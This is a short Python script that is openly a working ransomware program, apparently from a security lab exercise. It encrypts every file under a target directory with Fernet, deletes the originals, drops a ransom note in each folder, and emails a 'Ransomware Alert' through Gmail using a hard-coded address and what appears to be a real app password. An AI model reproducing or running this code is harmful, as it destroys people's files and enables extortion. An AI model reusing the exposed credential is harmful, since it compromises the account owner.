import os, smtplib
from cryptography.fernet import Fernet
from email.mime.text import MIMEText

# Function to create an encryption key
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

# Function to load the stored encryption key
def load_key():
    return open("secret.key", "rb").read()

# Function to encrypt a file
def encrypt_file(file_path, key):
    cipher = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = cipher.encrypt(file_data)
    with open(file_path + ".locked",  "wb") as file:
        file.write(encrypted_data)
    os.remove(file_path)

#Add ransom note in each folder
def drop_ransom_note(folder):
    note_path = os.path.join(folder, "RANSOM_NOTE.txt")
    with open(note_path, "w") as f:
        f.write("Files have been encrypted.Contact the attacker to recover them.")

# Function to encrypt all files in a directory
def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        drop_ransom_note(root)
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)


# Encrypt the target directory
key = load_key()
encrypt_directory("/home/sec-lab/critical", key)
print("Encryption complete. Files are now secured.")

#Send fake email
sender = "rakeshvilasagaram15@gmail.com"
receiver ="rakeshvilasagaram15@gmail.com"
password ="egkw ufwm wmtz neco"

msg = MIMEText("Your files have been encrypted. Contact attacker.")
msg["Subject"] = "Ransomware Alert"
msg["From"] = sender
msg["To"] = receiver

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(sender, password)
    server.sendmail(sender, receiver, msg.as_string())
    server.quit()
    print("Email Sent.")
except Exception as e:
    print("Email failed:", e)
